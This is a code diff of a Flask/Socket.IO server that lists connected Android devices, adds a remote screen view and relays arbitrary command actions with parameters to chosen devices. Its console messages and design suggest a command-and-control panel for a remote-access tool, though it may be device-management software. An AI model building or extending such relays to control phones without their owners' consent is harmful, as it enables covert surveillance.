@@ -45,8 +45,16 @@ def dashboard():
     dev_list = [{"id": k, "model": v.get("model","?"), "android": v.get("android","?"),
                  "battery": v.get("battery",0), "ip": v.get("ip","?"),
                  "online": v.get("online",False)} for k,v in devices.items()]
-    return render_template("dashboard.html", total=total, online=online,
-                          offline=total-online, devices=dev_list)
+    return render_template("dashboard.html",
+                           total=total, online=online,
+                           offline=total-online, devices=dev_list,
+                           session_user=session.get("user", "Admin"))
+
+@app.route("/screen")
+def screen_view():
+    if "user" not in session:
+        return redirect("/login")
+    return render_template("screen.html")
 
 @socketio.on("register")
 def on_register(data):
@@ -57,22 +65,24 @@ def on_register(data):
                     "sid": request.sid}
     join_room(did)
     emit("registered", {"id": did}, room=request.sid)
-    socketio.emit("devices_update", devices)
-
-@socketio.on("heartbeat")
-def on_heartbeat(data):
-    did = data.get("id")
-    if did in devices:
-        devices[did]["online"] = True
+    socketio.emit("devices_update", devices, broadcast=True)
+    print(f"[+] Device: {did}")
 
 @socketio.on("send_command")
 def on_send_command(data):
     target = data.get("target")
-    if target in devices:
-        socketio.emit("execute", {"action": data.get("action")}, room=target)
+    action = data.get("action")
+    params = data.get("params", {})
+    if target and target in devices:
+        cmd = {"action": action}
+        cmd.update(params)
+        socketio.emit("execute", cmd, room=target)
+        print(f"[>] {target}: {action}")
 
 @socketio.on("response")
 def on_response(data):
+    did = data.get("id")
+    rtype = data.get("type")
     socketio.emit("device_response", data, broadcast=True)
 
 @app.route("/api/devices")
